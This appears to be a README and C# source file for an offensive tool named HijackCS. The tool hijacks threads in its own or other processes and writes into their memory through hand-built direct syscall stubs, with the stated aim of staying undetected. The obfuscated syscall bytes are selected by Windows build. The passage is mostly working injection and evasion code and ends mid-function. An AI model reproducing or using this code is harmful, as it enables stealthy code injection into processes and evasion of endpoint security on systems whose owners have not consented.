# HijackCS
Hijack your own process or other, use syscall NtWriteVirtualMemory and NtAllocateVirtualMemory to stay undetected, using CONTEXT64 context. 

Compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /target:exe /unsafe Hijack.cs
Execution: Hijack.exe

Hijack.cs:

```
using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;


public class Code
{

	[DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll")]
    static extern uint SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

	[DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

	[DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

	[DllImport("kernel32", CharSet = CharSet.Auto,SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

  [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
  static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("ntdll.dll")]
  public static extern NTSTATUS NtProtectVirtualMemory( [In] IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, [In] MemoryProtection NewProtect, [Out] out MemoryProtection OldProtect );

	[DllImport("kernel32.dll")]
	static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

	[SuppressUnmanagedCodeSecurity]
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate NTSTATUS NtWriteVirtualMemoryX(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

	[SuppressUnmanagedCodeSecurity]
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate NTSTATUS NtAllocateVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect );

	[SuppressUnmanagedCodeSecurity]
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);

	[DllImport("kernel32", EntryPoint = "CreateProcess")]
	public static extern int CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDriectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

  public const int CREATE_SUSPENDED = 0x00000004;

	    public enum NTSTATUS : uint
	    {
	        Success = 0x00000000,
	        Wait0 = 0x00000000,
	        Wait1 = 0x00000001,
	        Wait2 = 0x00000002,
	        Wait3 = 0x00000003,
	        Wait63 = 0x0000003f,
	        Abandoned = 0x00000080,
	        AbandonedWait0 = 0x00000080,
	        AbandonedWait1 = 0x00000081,
	        AbandonedWait2 = 0x00000082,
	        AbandonedWait3 = 0x00000083,
	        AbandonedWait63 = 0x000000bf,
	        UserApc = 0x000000c0,
	        KernelApc = 0x00000100,
	        Alerted = 0x00000101,
	        Timeout = 0x00000102,
	        Pending = 0x00000103,
	        Reparse = 0x00000104,
	        MoreEntries = 0x00000105,
	        NotAllAssigned = 0x00000106,
	        SomeNotMapped = 0x00000107,
	        OpLockBreakInProgress = 0x00000108,
	        VolumeMounted = 0x00000109,
	        RxActCommitted = 0x0000010a,
	        NotifyCleanup = 0x0000010b,
	        NotifyEnumDir = 0x0000010c,
	        NoQuotasForAccount = 0x0000010d,
	        PrimaryTransportConnectFailed = 0x0000010e,
	        PageFaultTransition = 0x00000110,
	        PageFaultDemandZero = 0x00000111,
	        PageFaultCopyOnWrite = 0x00000112,
	        PageFaultGuardPage = 0x00000113,
	        PageFaultPagingFile = 0x00000114,
	        CrashDump = 0x00000116,
	        ReparseObject = 0x00000118,
	        NothingToTerminate = 0x00000122,
	        ProcessNotInJob = 0x00000123,
	        ProcessInJob = 0x00000124,
	        ProcessCloned = 0x00000129,
	        FileLockedWithOnlyReaders = 0x0000012a,
	        FileLockedWithWriters = 0x0000012b,
	        Informational = 0x40000000,
	        ObjectNameExists = 0x40000000,
	        ThreadWasSuspended = 0x40000001,
	        WorkingSetLimitRange = 0x40000002,
	        ImageNotAtBase = 0x40000003,
	        RegistryRecovered = 0x40000009,
	        Warning = 0x80000000,
	        GuardPageViolation = 0x80000001,
	        DatatypeMisalignment = 0x80000002,
	        Breakpoint = 0x80000003,
	        SingleStep = 0x80000004,
	        BufferOverflow = 0x80000005,
	        NoMoreFiles = 0x80000006,
	        HandlesClosed = 0x8000000a,
	        PartialCopy = 0x8000000d,
	        DeviceBusy = 0x80000011,
	        InvalidEaName = 0x80000013,
	        EaListInconsistent = 0x80000014,
	        NoMoreEntries = 0x8000001a,
	        LongJump = 0x80000026,
	        DllMightBeInsecure = 0x8000002b,
	        Error = 0xc0000000,
	        Unsuccessful = 0xc0000001,
	        NotImplemented = 0xc0000002,
	        InvalidInfoClass = 0xc0000003,
	        InfoLengthMismatch = 0xc0000004,
	        AccessViolation = 0xc0000005,
	        InPageError = 0xc0000006,
	        PagefileQuota = 0xc0000007,
	        InvalidHandle = 0xc0000008,
	        BadInitialStack = 0xc0000009,
	        BadInitialPc = 0xc000000a,
	        InvalidCid = 0xc000000b,
	        TimerNotCanceled = 0xc000000c,
	        InvalidParameter = 0xc000000d,
	        NoSuchDevice = 0xc000000e,
	        NoSuchFile = 0xc000000f,
	        InvalidDeviceRequest = 0xc0000010,
	        EndOfFile = 0xc0000011,
	        WrongVolume = 0xc0000012,
	        NoMediaInDevice = 0xc0000013,
	        NoMemory = 0xc0000017,
	        ConflictingAddresses = 0xc0000018,
	        NotMappedView = 0xc0000019,
	        UnableToFreeVm = 0xc000001a,
	        UnableToDeleteSection = 0xc000001b,
	        IllegalInstruction = 0xc000001d,
	        AlreadyCommitted = 0xc0000021,
	        AccessDenied = 0xc0000022,
	        BufferTooSmall = 0xc0000023,
	        ObjectTypeMismatch = 0xc0000024,
	        NonContinuableException = 0xc0000025,
	        BadStack = 0xc0000028,
	        NotLocked = 0xc000002a,
	        NotCommitted = 0xc000002d,
	        InvalidParameterMix = 0xc0000030,
	        ObjectNameInvalid = 0xc0000033,
	        ObjectNameNotFound = 0xc0000034,
	        ObjectNameCollision = 0xc0000035,
	        ObjectPathInvalid = 0xc0000039,
	        ObjectPathNotFound = 0xc000003a,
	        ObjectPathSyntaxBad = 0xc000003b,
	        DataOverrun = 0xc000003c,
	        DataLate = 0xc000003d,
	        DataError = 0xc000003e,
	        CrcError = 0xc000003f,
	        SectionTooBig = 0xc0000040,
	        PortConnectionRefused = 0xc0000041,
	        InvalidPortHandle = 0xc0000042,
	        SharingViolation = 0xc0000043,
	        QuotaExceeded = 0xc0000044,
	        InvalidPageProtection = 0xc0000045,
	        MutantNotOwned = 0xc0000046,
	        SemaphoreLimitExceeded = 0xc0000047,
	        PortAlreadySet = 0xc0000048,
	        SectionNotImage = 0xc0000049,
	        SuspendCountExceeded = 0xc000004a,
	        ThreadIsTerminating = 0xc000004b,
	        BadWorkingSetLimit = 0xc000004c,
	        IncompatibleFileMap = 0xc000004d,
	        SectionProtection = 0xc000004e,
	        EasNotSupported = 0xc000004f,
	        EaTooLarge = 0xc0000050,
	        NonExistentEaEntry = 0xc0000051,
	        NoEasOnFile = 0xc0000052,
	        EaCorruptError = 0xc0000053,
	        FileLockConflict = 0xc0000054,
	        LockNotGranted = 0xc0000055,
	        DeletePending = 0xc0000056,
	        CtlFileNotSupported = 0xc0000057,
	        UnknownRevision = 0xc0000058,
	        RevisionMismatch = 0xc0000059,
	        InvalidOwner = 0xc000005a,
	        InvalidPrimaryGroup = 0xc000005b,
	        NoImpersonationToken = 0xc000005c,
	        CantDisableMandatory = 0xc000005d,
	        NoLogonServers = 0xc000005e,
	        NoSuchLogonSession = 0xc000005f,
	        NoSuchPrivilege = 0xc0000060,
	        PrivilegeNotHeld = 0xc0000061,
	        InvalidAccountName = 0xc0000062,
	        UserExists = 0xc0000063,
	        NoSuchUser = 0xc0000064,
	        GroupExists = 0xc0000065,
	        NoSuchGroup = 0xc0000066,
	        MemberInGroup = 0xc0000067,
	        MemberNotInGroup = 0xc0000068,
	        LastAdmin = 0xc0000069,
	        WrongPassword = 0xc000006a,
	        IllFormedPassword = 0xc000006b,
	        PasswordRestriction = 0xc000006c,
	        LogonFailure = 0xc000006d,
	        AccountRestriction = 0xc000006e,
	        InvalidLogonHours = 0xc000006f,
	        InvalidWorkstation = 0xc0000070,
	        PasswordExpired = 0xc0000071,
	        AccountDisabled = 0xc0000072,
	        NoneMapped = 0xc0000073,
	        TooManyLuidsRequested = 0xc0000074,
	        LuidsExhausted = 0xc0000075,
	        InvalidSubAuthority = 0xc0000076,
	        InvalidAcl = 0xc0000077,
	        InvalidSid = 0xc0000078,
	        InvalidSecurityDescr = 0xc0000079,
	        ProcedureNotFound = 0xc000007a,
	        InvalidImageFormat = 0xc000007b,
	        NoToken = 0xc000007c,
	        BadInheritanceAcl = 0xc000007d,
	        RangeNotLocked = 0xc000007e,
	        DiskFull = 0xc000007f,
	        ServerDisabled = 0xc0000080,
	        ServerNotDisabled = 0xc0000081,
	        TooManyGuidsRequested = 0xc0000082,
	        GuidsExhausted = 0xc0000083,
	        InvalidIdAuthority = 0xc0000084,
	        AgentsExhausted = 0xc0000085,
	        InvalidVolumeLabel = 0xc0000086,
	        SectionNotExtended = 0xc0000087,
	        NotMappedData = 0xc0000088,
	        ResourceDataNotFound = 0xc0000089,
	        ResourceTypeNotFound = 0xc000008a,
	        ResourceNameNotFound = 0xc000008b,
	        ArrayBoundsExceeded = 0xc000008c,
	        FloatDenormalOperand = 0xc000008d,
	        FloatDivideByZero = 0xc000008e,
	        FloatInexactResult = 0xc000008f,
	        FloatInvalidOperation = 0xc0000090,
	        FloatOverflow = 0xc0000091,
	        FloatStackCheck = 0xc0000092,
	        FloatUnderflow = 0xc0000093,
	        IntegerDivideByZero = 0xc0000094,
	        IntegerOverflow = 0xc0000095,
	        PrivilegedInstruction = 0xc0000096,
	        TooManyPagingFiles = 0xc0000097,
	        FileInvalid = 0xc0000098,
	        InstanceNotAvailable = 0xc00000ab,
	        PipeNotAvailable = 0xc00000ac,
	        InvalidPipeState = 0xc00000ad,
	        PipeBusy = 0xc00000ae,
	        IllegalFunction = 0xc00000af,
	        PipeDisconnected = 0xc00000b0,
	        PipeClosing = 0xc00000b1,
	        PipeConnected = 0xc00000b2,
	        PipeListening = 0xc00000b3,
	        InvalidReadMode = 0xc00000b4,
	        IoTimeout = 0xc00000b5,
	        FileForcedClosed = 0xc00000b6,
	        ProfilingNotStarted = 0xc00000b7,
	        ProfilingNotStopped = 0xc00000b8,
	        NotSameDevice = 0xc00000d4,
	        FileRenamed = 0xc00000d5,
	        CantWait = 0xc00000d8,
	        PipeEmpty = 0xc00000d9,
	        CantTerminateSelf = 0xc00000db,
	        InternalError = 0xc00000e5,
	        InvalidParameter1 = 0xc00000ef,
	        InvalidParameter2 = 0xc00000f0,
	        InvalidParameter3 = 0xc00000f1,
	        InvalidParameter4 = 0xc00000f2,
	        InvalidParameter5 = 0xc00000f3,
	        InvalidParameter6 = 0xc00000f4,
	        InvalidParameter7 = 0xc00000f5,
	        InvalidParameter8 = 0xc00000f6,
	        InvalidParameter9 = 0xc00000f7,
	        InvalidParameter10 = 0xc00000f8,
	        InvalidParameter11 = 0xc00000f9,
	        InvalidParameter12 = 0xc00000fa,
	        MappedFileSizeZero = 0xc000011e,
	        TooManyOpenedFiles = 0xc000011f,
	        Cancelled = 0xc0000120,
	        CannotDelete = 0xc0000121,
	        InvalidComputerName = 0xc0000122,
	        FileDeleted = 0xc0000123,
	        SpecialAccount = 0xc0000124,
	        SpecialGroup = 0xc0000125,
	        SpecialUser = 0xc0000126,
	        MembersPrimaryGroup = 0xc0000127,
	        FileClosed = 0xc0000128,
	        TooManyThreads = 0xc0000129,
	        ThreadNotInProcess = 0xc000012a,
	        TokenAlreadyInUse = 0xc000012b,
	        PagefileQuotaExceeded = 0xc000012c,
	        CommitmentLimit = 0xc000012d,
	        InvalidImageLeFormat = 0xc000012e,
	        InvalidImageNotMz = 0xc000012f,
	        InvalidImageProtect = 0xc0000130,
	        InvalidImageWin16 = 0xc0000131,
	        LogonServer = 0xc0000132,
	        DifferenceAtDc = 0xc0000133,
	        SynchronizationRequired = 0xc0000134,
	        DllNotFound = 0xc0000135,
	        IoPrivilegeFailed = 0xc0000137,
	        OrdinalNotFound = 0xc0000138,
	        EntryPointNotFound = 0xc0000139,
	        ControlCExit = 0xc000013a,
	        PortNotSet = 0xc0000353,
	        DebuggerInactive = 0xc0000354,
	        CallbackBypass = 0xc0000503,
	        PortClosed = 0xc0000700,
	        MessageLost = 0xc0000701,
	        InvalidMessage = 0xc0000702,
	        RequestCanceled = 0xc0000703,
	        RecursiveDispatch = 0xc0000704,
	        LpcReceiveBufferExpected = 0xc0000705,
	        LpcInvalidConnectionUsage = 0xc0000706,
	        LpcRequestsNotAllowed = 0xc0000707,
	        ResourceInUse = 0xc0000708,
	        ProcessIsProtected = 0xc0000712,
	        VolumeDirty = 0xc0000806,
	        FileCheckedOut = 0xc0000901,
	        CheckOutRequired = 0xc0000902,
	        BadFileType = 0xc0000903,
	        FileTooLarge = 0xc0000904,
	        FormsAuthRequired = 0xc0000905,
	        VirusInfected = 0xc0000906,
	        VirusDeleted = 0xc0000907,
	        TransactionalConflict = 0xc0190001,
	        InvalidTransaction = 0xc0190002,
	        TransactionNotActive = 0xc0190003,
	        TmInitializationFailed = 0xc0190004,
	        RmNotActive = 0xc0190005,
	        RmMetadataCorrupt = 0xc0190006,
	        TransactionNotJoined = 0xc0190007,
	        DirectoryNotRm = 0xc0190008,
	        CouldNotResizeLog = 0xc0190009,
	        TransactionsUnsupportedRemote = 0xc019000a,
	        LogResizeInvalidSize = 0xc019000b,
	        RemoteFileVersionMismatch = 0xc019000c,
	        CrmProtocolAlreadyExists = 0xc019000f,
	        TransactionPropagationFailed = 0xc0190010,
	        CrmProtocolNotFound = 0xc0190011,
	        TransactionSuperiorExists = 0xc0190012,
	        TransactionRequestNotValid = 0xc0190013,
	        TransactionNotRequested = 0xc0190014,
	        TransactionAlreadyAborted = 0xc0190015,
	        TransactionAlreadyCommitted = 0xc0190016,
	        TransactionInvalidMarshallBuffer = 0xc0190017,
	        CurrentTransactionNotValid = 0xc0190018,
	        LogGrowthFailed = 0xc0190019,
	        ObjectNoLongerExists = 0xc0190021,
	        StreamMiniversionNotFound = 0xc0190022,
	        StreamMiniversionNotValid = 0xc0190023,
	        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
	        CantOpenMiniversionWithModifyIntent = 0xc0190025,
	        CantCreateMoreStreamMiniversions = 0xc0190026,
	        HandleNoLongerValid = 0xc0190028,
	        NoTxfMetadata = 0xc0190029,
	        LogCorruptionDetected = 0xc0190030,
	        CantRecoverWithHandleOpen = 0xc0190031,
	        RmDisconnected = 0xc0190032,
	        EnlistmentNotSuperior = 0xc0190033,
	        RecoveryNotNeeded = 0xc0190034,
	        RmAlreadyStarted = 0xc0190035,
	        FileIdentityNotPersistent = 0xc0190036,
	        CantBreakTransactionalDependency = 0xc0190037,
	        CantCrossRmBoundary = 0xc0190038,
	        TxfDirNotEmpty = 0xc0190039,
	        IndoubtTransactionsExist = 0xc019003a,
	        TmVolatile = 0xc019003b,
	        RollbackTimerExpired = 0xc019003c,
	        TxfAttributeCorrupt = 0xc019003d,
	        EfsNotAllowedInTransaction = 0xc019003e,
	        TransactionalOpenNotAllowed = 0xc019003f,
	        TransactedMappingUnsupportedRemote = 0xc0190040,
	        TxfMetadataAlreadyPresent = 0xc0190041,
	        TransactionScopeCallbacksNotSet = 0xc0190042,
	        TransactionRequiredPromotion = 0xc0190043,
	        CannotExecuteFileInTransaction = 0xc0190044,
	        TransactionsNotFrozen = 0xc0190045,
	        MaximumNtStatus = 0xffffffff
	};

	[Flags]
	public enum MemoryProtection : uint
	{
			AccessDenied = 0x0,
			Execute = 0x10,
			ExecuteRead = 0x20,
			ExecuteReadWrite = 0x40,
			ExecuteWriteCopy = 0x80,
			Guard = 0x100,
			NoCache = 0x200,
			WriteCombine = 0x400,
			NoAccess = 0x01,
			ReadOnly = 0x02,
			ReadWrite = 0x04,
			WriteCopy = 0x08,
			//SEC_NO_CHANGE = 0x00400000
	}

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
  	const uint PAGE_EXECUTE_READWRITE = 0x40;

	  [Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
	    THREAD_SUSPEND = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }

	public enum CONTEXT_FLAGS : uint
	{
	   CONTEXT_i386 = 0x10000,
	   CONTEXT_i486 = 0x10000,   //  same as i386
	   CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
	   CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
	   CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
	   CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
	   CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
	   CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
	   CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
	   CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |  CONTEXT_EXTENDED_REGISTERS
	}

	// x86 float save
	[StructLayout(LayoutKind.Sequential)]
	public struct FLOATING_SAVE_AREA
	{
		 public uint ControlWord;
		 public uint StatusWord;
		 public uint TagWord;
		 public uint ErrorOffset;
		 public uint ErrorSelector;
		 public uint DataOffset;
		 public uint DataSelector;
		 [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		 public byte[] RegisterArea;
		 public uint Cr0NpxState;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct M128A
	{
		 public ulong High;
		 public long Low;

		 public override string ToString()
		 {
		return string.Format("High:{0}, Low:{1}", this.High, this.Low);
		 }
	}

	// x64 save format
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct XSAVE_FORMAT64
	{
		public ushort ControlWord;
		public ushort StatusWord;
		public byte TagWord;
		public byte Reserved1;
		public ushort ErrorOpcode;
		public uint ErrorOffset;
		public ushort ErrorSelector;
		public ushort Reserved2;
		public uint DataOffset;
		public ushort DataSelector;
		public ushort Reserved3;
		public uint MxCsr;
		public uint MxCsr_Mask;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public M128A[] FloatRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public M128A[] XmmRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
		public byte[] Reserved4;
	}

	// x64 context structure
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct CONTEXT64
	{
		public ulong P1Home;
		public ulong P2Home;
		public ulong P3Home;
		public ulong P4Home;
		public ulong P5Home;
		public ulong P6Home;

		public CONTEXT_FLAGS ContextFlags;
		public uint MxCsr;

		public ushort SegCs;
		public ushort SegDs;
		public ushort SegEs;
		public ushort SegFs;
		public ushort SegGs;
		public ushort SegSs;
		public uint EFlags;

		public ulong Dr0;
		public ulong Dr1;
		public ulong Dr2;
		public ulong Dr3;
		public ulong Dr6;
		public ulong Dr7;

		public ulong Rax;
		public ulong Rcx;
		public ulong Rdx;
		public ulong Rbx;
		public ulong Rsp;
		public ulong Rbp;
		public ulong Rsi;
		public ulong Rdi;
		public ulong R8;
		public ulong R9;
		public ulong R10;
		public ulong R11;
		public ulong R12;
		public ulong R13;
		public ulong R14;
		public ulong R15;
		public ulong Rip;

		public XSAVE_FORMAT64 DUMMYUNIONNAME;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
		public M128A[] VectorRegister;
		public ulong VectorControl;

		public ulong DebugControl;
		public ulong LastBranchToRip;
		public ulong LastBranchFromRip;
		public ulong LastExceptionToRip;
		public ulong LastExceptionFromRip;
		}


		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct OSVERSIONINFOEXW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
        public UInt16 wServicePackMajor;
        public UInt16 wServicePackMinor;
        public UInt16 wSuiteMask;
        public byte wProductType;
        public byte wReserved;
    }


		public struct STARTUPINFO
		{
				public int cb;
				public string lpReserved;
				public string lpDesktop;
				public string lpTitle;
				public int dwX;
				public int dwY;
				public int dwXSize;
				public int dwYSize;
				public int dwXCountChars;
				public int dwYCountChars;
				public int dwFillAttribute;
				public int dwFlags;
				public short wShowWindow;
				public short cbReserved2;
				public int lpReserved2;
				public IntPtr hStdInput;
				public IntPtr hStdOutput;
				public IntPtr hStdError;
		}

		public struct PROCESS_INFORMATION
		{
				public IntPtr hProcess;
				public IntPtr hThread;
				public int dwProcessId;
				public int dwThreadId;
		}


		public static NTSTATUS NtWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                NtWriteVirtualMemoryX NtWriteVirtualMemoryFunc = (NtWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtWriteVirtualMemoryX));
                return (NTSTATUS)NtWriteVirtualMemoryFunc(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
        }
    }

		public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
		{
				byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
				unsafe
				{
						fixed (byte* ptr = syscall)
						{
								IntPtr allocMemAddress = (IntPtr)ptr;
								IntPtr allocMemAddressCopy = (IntPtr)ptr;
								MemoryProtection oldProtection;
								uint size = (uint)syscall.Length;
								IntPtr sizeIntPtr = (IntPtr)size;
								NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
								NtAllocateVirtualMemoryX NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtAllocateVirtualMemoryX));
								return (NTSTATUS)NtAllocateVirtualMemoryFunc(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
						}
				}
		}



		public static byte [] GetOSVersionAndReturnSyscall(byte sysType )
		{
				var syscall = new byte [] { 074, 138, 203, 185, 001, 001, 001, 001, 016, 006, 196 };
				var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
				NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);
				// Client OS Windows 10 build 1803, 1809, 1903, 1909, 2004
				if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 19041)) // 2004
				{
					// NtOpenProcess
					if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtCreateThreadEx
					if (sysType == 2) { syscall[4] = 194; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtWriteVirtualMemory
					if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtAllocateVirtualMemory
					if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtCreateSection
					if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtMapViewOfSection
					if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtCreateProcess
					if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtOpenThread
					if (sysType == 8) {
						//syscall[4] = 295;
						for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }

						var syscallIdentifierBytes = BitConverter.GetBytes(0x12E);
						Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint));

						} else
					// NtResumeThread
					if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
					// NtWaitForSingleObject
					if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}

				} else
				if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
				{
						// NtOpenProcess
						if (sysType == 1) {syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// NtCreateThreadEx
						if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// ZwWriteVirtualMemory
						if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// NtAllocateVirtualMemory
						if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// NtCreateSection
						if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// NtMapViewOfSection
						if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// ZwCreateProcess
						if (sysType == 7) { syscall[4] = 182; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// NtOpenThread
						if (sysType == 8) {
							//syscall[4] = 1;
							for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }

							var syscallIdentifierBytes = BitConverter.GetBytes(0x129);
							Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint));

							} else // 297
						// NtResumeThread
						if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
						// NtWaitForSingleObject
						if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}} else
							if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
							{
									// ZwOpenProcess
									if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtCreateThreadEx
									if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// ZwWriteVirtualMemory
									if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtAllocateVirtualMemory
									if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtCreateSection
									if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtMapViewOfSection
									if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// ZwCreateProcess
									if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtOpenThread
									if (sysType == 8) {
										//syscall[4] = 295;
